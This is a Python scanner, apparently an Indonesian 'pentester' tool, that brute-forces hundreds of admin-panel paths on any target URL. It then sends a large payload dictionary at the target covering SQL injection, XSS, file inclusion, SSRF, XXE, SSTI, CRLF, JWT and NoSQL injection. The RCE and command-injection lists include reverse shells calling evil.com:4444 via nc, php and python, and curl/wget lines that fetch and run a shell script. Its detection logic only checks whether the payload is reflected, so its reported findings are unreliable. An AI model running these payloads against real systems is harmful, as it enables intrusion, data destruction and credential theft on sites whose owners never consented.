#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Developer: Ade Pratama (HolyBytes)
# GitHub: https://github.com/HolyBytes
# Saweria: https://saweria.co/HolyBytes
# Versi: 2.0 BETA
# Team: BugPent CyberCore

import os
import sys
import requests
import threading
import time
from queue import Queue
from colorama import Fore, Style, init
from bs4 import BeautifulSoup
from urllib.parse import urljoin

init(autoreset=True)

# ASCII Art dan Informasi Tools
ASCII_ART = f"""
{Fore.YELLOW}
  ____            _       ____        _   _                  
 | __ ) _   _  __| |_   _|  _ \\ _   _| |_| |__   ___  _ __  
 |  _ \\| | | |/ _` | | | | |_) | | | | __| '_ \\ / _ \\| '_ \\ 
 | |_) | |_| | (_| | |_| |  __/| |_| | |_| | | | (_) | | | |
 |____/ \\__,_|\\__,_|\\__, |_|    \\__, |\\__|_| |_|\\___/|_| |_|
                    |___/       |___/                        
{Fore.CYAN}
  ╔══════════════════════════════════════════════════════════╗
  ║ {Fore.YELLOW}BUG HUNTER & PENTESTER TOOLS v2.0 BETA{Fore.CYAN}                 ║
  ║ {Fore.WHITE}Developer: Ade Pratama (HolyBytes)                     {Fore.CYAN}║
  ║ {Fore.WHITE}GitHub: https://github.com/HolyBytes                   {Fore.CYAN}║
  ║ {Fore.WHITE}Saweria: https://saweria.co/HolyBytes                  {Fore.CYAN}║
  ║ {Fore.WHITE}Team: BugPent CyberCore                                {Fore.CYAN}║
  ╚══════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

# Perlindungan Anti-Rename
if os.path.basename(__file__) != "bugpent.py":
    print(f"{Fore.RED}[ERROR] Tools ini tidak bisa di-rename! Gunakan nama file 'bugpent.py'{Style.RESET_ALL}")
    sys.exit(1)

# Daftar path admin panel (200+ path)
ADMIN_PATHS = [
    "admin", "admin/login", "adminpanel", "wp-admin", "administrator",
    "login", "cpanel", "controlpanel", "webadmin", "backend",
    "manager", "system", "sysadmin", "dashboard", "admincp",
    "admin_area", "adminarea", "panel-administracion", "adminLogin",
    "admin_login", "moderator", "administrate", "administration",
    "phpmyadmin", "myadmin", "ur-admin", "server-admin", "admincontrol",
    "admin-admin", "directadmin", "adm", "account", "member",
    "members", "root", "staff", "superuser", "supervisor",
    "webmaster", "sysadm", "admin1", "admin2", "admin3",
    "admin4", "admin5", "useradmin", "adminaccount", "adminportal",
    "adminconsole", "admincenter", "adminhome", "admininterface",
    "admintools", "adminutility", "adminview", "adminweb", "adminzone",
    "secureadmin", "securelogin", "securepanel", "siteadmin", "siteadmin/login",
    "siteadministrator", "stafflogin", "support", "supportadmin", "techsupport",
    "user", "users", "webadmin/login", "webadministrator", "webmaster/login",
    "adminsite", "administer", "adminaccess", "adminbackend", "admindashboard",
    "admindb", "adminhomepage", "adminindex", "adminloginpage", "adminpanel/login",
    "adminphp", "admins", "adminsystem", "adminui", "adminutility/login",
    "control", "controlpanel/login", "cp", "customer", "customercare",
    "dbadmin", "dblogin", "forumadmin", "hosting-admin", "joomla-admin",
    "loginadmin", "logins", "memberadmin", "memberlogin", "mysqladmin",
    "order", "orders", "phpadmin", "phppgadmin", "register",
    "registration", "server", "shopadmin", "sqladmin", "sshd",
    "status", "superadmin", "supervisorlogin", "upload", "uploads",
    "vhost", "webadminpanel", "webdisk", "webmail", "websql",
    "workplace", "wp-login", "wp-login.php", "xpanel", "zadmin",
    "account/login", "accounts", "acladmin", "ad", "admon",
    "ads", "adsl", "adsladmin", "affiliate", "affiliates",
    "ajax", "analytics", "app", "appadmin", "apps",
    "auth", "authentication", "authorize", "backoffice", "backup",
    "banneradmin", "banners", "beta", "billing", "blog",
    "blogadmin", "board", "boardadmin", "bot", "bots",
    "cache", "calendar", "catalog", "cgi", "cgi-bin",
    "chat", "chatadmin", "client", "clientlogin", "clients",
    "cms", "cmsadmin", "config", "configuration", "connect",
    "contact", "content", "contentadmin", "controlcenter", "controller",
    "coppa", "core", "counter", "counters", "cpadmin",
    "cron", "css", "cssadmin", "customercenter", "customers",
    "data", "database", "db", "dbs", "debug",
    "demo", "design", "dev", "developer", "developers",
    "dir", "directory", "docs", "domain", "domainadmin",
    "download", "downloads", "edit", "editor", "email",
    "emailadmin", "error", "errors", "event", "events",
    "faq", "faqs", "file", "fileadmin", "files",
    "flash", "form", "forms", "forum", "forums",
    "friend", "friends", "ftp", "ftps", "gallery",
    "game", "games", "gateway", "gopher", "group",
    "groups", "guest", "guests", "help", "home",
    "homepage", "host", "html", "http", "https",
    "image", "images", "img", "include", "includes",
    "index", "info", "information", "install", "internal",
    "intranet", "invite", "invoice", "ipad", "iphone",
    "java", "javascript", "job", "jobs", "js",
    "json", "kb", "knowledgebase", "lang", "language",
    "lib", "library", "license", "link", "links",
    "list", "lists", "log", "logging", "loginpage",
    "logo", "logs", "mail", "mailadmin", "main",
    "maintenance", "manage", "management", "managerlogin", "marketing",
    "media", "memberarea", "membership", "message", "messages",
    "mobile", "mod", "model", "moderatorlogin", "monitor",
    "movie", "movies", "msg", "music", "mysql",
    "nav", "navigation", "net", "network", "new",
    "news", "newsletter", "newsletters", "notify", "online",
    "operator", "orderform", "orders", "page", "pages",
    "partner", "partners", "password", "payment", "payments",
    "photo", "photos", "plugin", "plugins", "policy",
    "pop", "pop3", "portal", "post", "postmaster",
    "posts", "preferences", "premium", "press", "price",
    "pricing", "privacy", "private", "product", "products",
    "profile", "profiles", "project", "projects", "promo",
    "pub", "public", "publish", "publisher", "purchase",
    "purchases", "query", "random", "readme", "recent",
    "redirect", "register", "registered", "registration", "remote",
    "report", "reports", "reseller", "restricted", "rss",
    "rule", "rules", "sales", "sample", "samples",
    "save", "script", "scripts", "search", "secure",
    "security", "send", "server", "service", "services",
    "setting", "settings", "setup", "shop", "shopping",
    "signin", "signout", "signup", "site", "sitemap",
    "sites", "smarty", "sms", "smtp", "soap",
    "software", "sql", "ssh", "ssl", "staffarea",
    "stat", "static", "statistics", "stats", "status",
    "store", "stores", "style", "styles", "stylesheet",
    "sub", "subscribe", "subscription", "support", "survey",
    "sync", "sys", "system", "tablet", "tag",
    "tags", "task", "tasks", "tech", "template",
    "templates", "temp", "test", "testing", "text",
    "theme", "themes", "thread", "threads", "tmp",
    "todo", "tool", "tools", "topic", "topics",
    "tour", "translation", "tutorial", "tutorials", "tv",
    "update", "upload", "uploads", "url", "usage",
    "user", "users", "video", "videos", "visitor",
    "web", "webapp", "webapps", "webinar", "website",
    "websites", "welcome", "widget", "widgets", "wiki",
    "win", "windows", "wordpress", "work", "works",
    "xml", "xmpp", "xxx", "yaml", "year"
]

# Payload untuk deteksi kerentanan
PAYLOADS = {
    "SQL Injection": [
        "'", 
        "\"", 
        "1' OR '1'='1", 
        "1\" OR \"1\"=\"1",
        "admin'--",
        "admin'#",
        "admin'/*",
        "' OR 1=1--",
        "' OR 'a'='a",
        "') OR ('a'='a",
        "\" OR \"\"=\"",
        "\") OR (\"\"=\"",
        "' OR 1=1 LIMIT 1--",
        "' UNION SELECT null, username, password FROM users--",
        "' UNION SELECT 1,@@version,3,4--",
        "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
        "1; DROP TABLE users--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1 AND SLEEP(5)",
        "1 AND (SELECT * FROM (SELECT(SLEEP(5)))abc)"
    ],
    
    "XSS": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=\"javascript:alert('XSS');\">",
        "\"><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "JaVaScRiPt:alert('XSS')",
        "onmouseover=alert('XSS')",
        "\" onfocus=\"alert('XSS')\" autofocus=\"",
        "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">",
        "{{constructor.constructor('alert(\"XSS\")')()}}",
        "<embed code=\"http://attack.com/xss.swf\" allowscriptaccess=always>",
        "<?xml version=\"1.0\"?><html xmlns=\"http://www.w3.org/1999/xhtml\"><body onload=\"alert('XSS')\"></body></html>"
    ],
    
    "LFI (Local File Inclusion)": [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "../../../../etc/shadow",
        "../../../../boot.ini",
        "../../../../windows/win.ini",
        "../../../../windows/system32/drivers/etc/hosts",
        "file:///etc/passwd",
        "....\\....\\....\\windows\\win.ini",
        "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "../../../../var/log/apache2/access.log",
        "../../../../var/log/auth.log",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"
    ],
    
    "RFI (Remote File Inclusion)": [
        "http://evil.com/shell.txt",
        "https://evil.com/shell.txt",
        "\\\\evil.com\\share\\shell.txt",
        "ftp://evil.com/shell.txt",
        "file://evil.com/shell.txt",
        "//evil.com/shell.txt",
        "\\\\192.168.1.100\\share\\shell.txt"
    ],
    
   "RCE (Remote Code Execution)": [
        "; ls",
        "| cat /etc/passwd",
        "`whoami`",
        "$(whoami)",
        "|| ping -c 1 evil.com",
        "&& curl http://evil.com/shell.sh | sh",
        "; nc -lvp 4444 -e /bin/sh",
        "| nc evil.com 4444 -e /bin/sh",
        "`nc evil.com 4444 -e /bin/bash`",
        "; php -r '$sock=fsockopen(\"evil.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "<?php system($_GET['cmd']); ?>",
        "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",  # Perbaikan di sini
        "| perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\n\"; system(\"ls\");'",
        "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    ],
    
    "Directory Traversal": [
        "../",
        "..\\",
        "%2e%2e%2f",
        "%2e%2e/",
        "..%00/",
        "..%0d/",
        "..%5c",
        "..%ff/",
        "..\\",
        "..%c0%af",
        "..%c1%9c"
    ],
    
    "Command Injection": [
        "| dir",
        "; id",
        "`id`",
        "$(id)",
        "|| id",
        "&& id",
        "| ping -n 1 evil.com",
        "& ping -n 1 evil.com",
        "| nslookup evil.com",
        "& nslookup evil.com",
        "`nslookup evil.com`",
        "$(nslookup evil.com)",
        "| wget http://evil.com/shell.sh -O /tmp/shell.sh",
        "& wget http://evil.com/shell.sh -O /tmp/shell.sh"
    ],
    
    "SSRF (Server Side Request Forgery)": [
        "http://localhost",
        "http://127.0.0.1",
        "http://0.0.0.0",
        "http://[::1]",
        "http://169.254.169.254/latest/meta-data/",
        "http://internal.service",
        "file:///etc/passwd",
        "gopher://evil.com:80/_GET%20/internal/secret",
        "dict://evil.com:80/info",
        "ftp://evil.com:21/file.txt"
    ],
    
    "XXE (XML External Entity)": [
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/evil.dtd\">]><foo>&xxe;</foo>",
        "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe;]><foo></foo>"
    ],
    
    "SSTI (Server Side Template Injection)": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "${{7*7}}",
        "@(7*7)",
        "#{7*7}",
        "{{ ''.__class__.__mro__[1].__subclasses__() }}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
    ],
    
    "Open Redirect": [
        "http://evil.com",
        "https://evil.com",
        "//evil.com",
        "\\\\evil.com",
        "http://google.com@evil.com",
        "http://evil.com\\@google.com",
        "http://evil.com?next=google.com",
        "http://evil.com#google.com",
        "http://evil.com/redirect.php?url=http://evil.com",
        "http://evil.com/redirect.php?url=//evil.com"
    ],
    
    "Header Injection": [
        "X-Forwarded-For: 127.0.0.1",
        "X-Real-IP: 127.0.0.1",
        "Host: evil.com",
        "Referer: http://evil.com",
        "User-Agent: <?php system('id'); ?>",
        "Cookie: PHPSESSID=../../../../etc/passwd",
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin"
    ],
    
    "CRLF Injection": [
        "test%0d%0aSet-Cookie:%20malicious=payload",
        "test%0d%0aLocation:%20http://evil.com",
        "test%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<html>Malicious</html>",
        "test%0d%0aX-XSS-Protection:%200",
        "test%0d%0aX-Forwarded-For:%20127.0.0.1"
    ],
    
    "JWT Tampering": [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.8gZ8wZ8wZ8wZ8wZ8wZ8wZ8wZ8wZ8wZ8wZ8wZ8wZ8",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "eyJhbGciOiJub25lIn0.eyJpc3MiOiJqb2UiLCJleHAiOjEzMDA4MTkzODAsIm5hbWUiOiJhZG1pbiIsImFkbWluIjp0cnVlfQ."
    ],
    
    "NoSQL Injection": [
        "admin' || '1'=='1",
        "admin' || 1==1//",
        "{\"$where\": \"true\"}",
        "{\"$ne\": \"\"}",
        "{\"$gt\": \"\"}", 
        "{\"$regex\": \".*\"}",
        "admin' || 1==1%00",
        "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
        "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
        "{\"username\": \"admin\", \"password\": {\"$regex\": \"^a\"}}"
    ]
}

class Scanner:
    def __init__(self, target, level=10, threads=10):
        self.target = target if target.startswith(('http://', 'https://')) else f"http://{target}"
        self.level = min(max(1, level), 20)  # Level antara 1-20
        self.threads = threads
        self.queue = Queue()
        self.found = []
        self.vulnerabilities = []
        self.scanning = True
        self.total_paths = len(ADMIN_PATHS[:self.level * 10])  # Skala berdasarkan level

    def animate(self):
        chars = ["�", "�", "⠎", "⠋", "⠙", "⠸", "⢰", "⣠", "⣄", "⡆"]
        i = 0
        while self.scanning:
            print(f"\r{Fore.YELLOW}[{chars[i % len(chars)]}] Scanning... ({len(self.found)} ditemukan)", end="")
            i += 1
            time.sleep(0.1)
        print("\r" + " " * 50 + "\r", end="")

    def scan_path(self):
        while not self.queue.empty():
            path = self.queue.get()
            try:
                url = urljoin(self.target, path)
                r = requests.get(url, timeout=10)
                if r.status_code == 200:
                    title = BeautifulSoup(r.text, 'html.parser').title
                    title = title.string if title else "No Title"
                    self.found.append((url, title))
            except:
                pass
            self.queue.task_done()

    def scan_vulnerabilities(self):
        for vuln_type, payloads in PAYLOADS.items():
            for payload in payloads:
                try:
                    test_url = f"{self.target}/?test={payload}"
                    r = requests.get(test_url, timeout=10)
                    if payload.lower() in r.text.lower():
                        self.vulnerabilities.append((vuln_type, test_url))
                        break
                except:
                    continue

    def start_scan(self):
        print(f"{Fore.CYAN}\n[+] Memulai scan pada: {self.target}")
        print(f"[+] Level scan: {self.level} (Menggunakan {self.total_paths} path)")
        print(f"[+] Threads: {self.threads}\n")

        # Setup queue dengan path berdasarkan level
        for path in ADMIN_PATHS[:self.total_paths]:
            self.queue.put(path)

        # Jalankan animasi
        threading.Thread(target=self.animate, daemon=True).start()

        # Jalankan threads untuk scan
        for _ in range(self.threads):
            t = threading.Thread(target=self.scan_path)
            t.start()

        self.queue.join()
        self.scanning = False

        # Scan kerentanan
        self.scan_vulnerabilities()

        # Tampilkan hasil
        self.show_results()

    def show_results(self):
        print(f"\n{Fore.GREEN}╔══════════════════════════════════════════════════╗")
        print(f"║ {Fore.YELLOW}HASIL SCAN ADMIN PANEL{Fore.GREEN}                          ║")
        print(f"╚══════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        if not self.found:
            print(f"{Fore.RED}[!] Tidak ditemukan panel admin.{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}+{'━'*60}+")
            print(f"| {'URL':<40} | {'Title':<15} |")
            print(f"+{'━'*60}+")
            for url, title in self.found:
                print(f"| {Fore.GREEN}{url:<40}{Style.RESET_ALL} | {title:<15} |")
            print(f"+{'━'*60}+")

        print(f"\n{Fore.GREEN}╔══════════════════════════════════════════════════╗")
        print(f"║ {Fore.YELLOW}KERENTANAN YANG DITEMUKAN{Fore.GREEN}                       ║")
        print(f"╚══════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        if not self.vulnerabilities:
            print(f"{Fore.GREEN}[+] Tidak ditemukan kerentanan.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}+{'━'*60}+")
            print(f"| {'Tipe Kerentanan':<30} | {'Payload':<25} |")
            print(f"+{'━'*60}+")
            for vuln, payload in self.vulnerabilities:
                print(f"| {Fore.RED}{vuln:<30}{Style.RESET_ALL} | {payload:<25} |")
            print(f"+{'━'*60}+")

def main():
    print(ASCII_ART)
    
    try:
        target = input(f"{Fore.CYAN}[?] Masukkan target URL (contoh: example.com): {Style.RESET_ALL}")
        level = int(input(f"{Fore.CYAN}[?] Masukkan level scan (1-20): {Style.RESET_ALL}"))
        
        scanner = Scanner(target, level)
        scanner.start_scan()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan dihentikan oleh pengguna.{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[ERROR] Terjadi kesalahan: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()
